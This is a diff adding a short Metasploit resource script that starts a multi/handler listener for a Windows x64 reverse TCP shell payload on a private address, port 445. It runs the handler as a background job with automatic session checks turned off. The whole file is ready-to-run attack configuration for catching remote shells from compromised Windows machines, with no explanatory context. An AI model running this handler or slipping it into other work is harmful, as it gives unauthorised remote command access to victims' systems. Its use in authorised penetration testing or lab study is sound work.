@@ -1,0 +1,9 @@
+use multi/handler
+set payload payload/windows/x64/shell_reverse_tcp
+set LHOST 192.168.1.181
+set LPORT 445
+set ExitOnSession false
+set AutoVerifySession false
+set AutoSystemInfo false
+set AutoLoadStdapi false
+exploit -j
